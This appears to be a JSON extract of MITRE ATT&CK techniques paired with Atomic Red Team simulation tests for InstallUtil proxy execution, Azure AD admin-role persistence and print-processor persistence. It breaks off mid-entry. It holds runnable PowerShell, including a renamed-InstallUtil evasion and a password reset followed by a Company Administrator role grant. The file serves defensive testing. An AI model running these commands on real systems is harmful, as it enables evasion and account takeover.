"technique_id": "attack-pattern--2cd950a6-16c4-404a-aa01-044322395107", "external_id": "T1218.004", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)", "atomic_tests": [{"name": "CheckIfInstallable method call", "auto_generated_guid": "ffd9c807-d402-47d2-879d-f915cf2a3a94", "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "CheckIfInstallable"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallHelper method call", "auto_generated_guid": "d43a5bde-ae28-4c55-a850-3f4c80573503", "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "InstallHelper"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallUtil class constructor method call", "auto_generated_guid": "9b7a7cfc-dd2e-43f5-a885-c0a3c270dd93", "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "Executable"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallUtil Install method call", "auto_generated_guid": "9f9968a6-601a-46ca-b7b7-6d4fe0f98f0b", "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "Executable"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallUtil Uninstall method call - /U variant", "auto_generated_guid": "34428cfa-8e38-41e5-aff4-9e1f8f3a7b4b", "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "Executable"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "auto_generated_guid": "06d9deba-f732-48a8-af8e-bdd6e4d98c1d", "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "Executable"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallUtil HelpText method call", "auto_generated_guid": "5a683850-1145-4326-a0e5-e91ced3c6022", "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "path", "default": "$Env:TEMP\\"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "string", "default": "Executable"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "string", "default": "T1218.004.dll"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "InstallUtil evasive invocation", "auto_generated_guid": "559e6d06-bb42-4307-bff7-3b95a8254bad", "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "path", "default": "PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1098.003": {"name": "Additional Cloud Roles", "technique_id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3", "external_id": "T1098.003", "data_components": ["User Account Modification"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in Azure AD environments, an adversary with the Application Administrator role can add [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to their application's service principal. In doing so the adversary would be able to gain the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) Similarly, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nSimilarly, an adversary with the Azure AD Global Administrator role can toggle the \u201cAccess management for Azure resources\u201d option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.(Citation: Azure AD to AD) ", "atomic_tests": [{"name": "Azure AD - Add Company Administrator Role to a user", "auto_generated_guid": "4d77f913-56f5-4a14-b4b1-bf7bb24298ad", "description": "Add an existing Azure user account the Company Administrator Role.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "target_user": {"description": "Name of the user who will be assigned the Company Admin role", "type": "string", "default": "default"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "MSOnline module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name MSOnline -Force\n"}], "executor": {"command": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\n", "cleanup_command": "Remove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role", "auto_generated_guid": "14f3af20-61f1-45b8-ad31-4637815f3f44", "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n", "supported_platforms": ["azure-ad"], "input_arguments": {"auth_username": {"description": "Azure AD username used to conduct the adversary activity", "type": "string", "default": "jonh@contoso.com"}, "auth_password": {"description": "Azure AD password for user auth_username", "type": "string", "default": "p4sswd"}, "target_user": {"description": "Name of the user whose password be reset and added to the admin role.", "type": "string", "default": "default"}, "target_password": {"description": "The password that the user target_user will be reset to.", "type": "string", "default": "Ohn05GeMe#$"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "MSOnline and AzureAD modules must be installed.\n", "prereq_command": "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n", "get_prereq_command": "Install-Module -Name MSOnline -Scope CurrentUser -Force\nInstall-Module -Name AzureAD -Scope CurrentUser -Force\n"}], "executor": {"command": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"#{target_password}\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq '#{target_user}'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"#{target_user}\"\n", "cleanup_command": "Import-Module MSOnline\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-MsolService -Credential $credential\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\nRemove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n", "name": "powershell", "elevation_required": false}}]}, "T1547.012": {"name": "Print Processors", "technique_id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad", "external_id": "T1547.012", "data_components": ["Module Load", "Driver Load", "File Creation", "OS API Execution", "Windows Registry Key Modification"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.", "atomic_tests": [{"name": "Print Processors", "auto_generated_guid": "f7d38f47-c61b-47cc-a59d-fc0368f47ed0", "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is 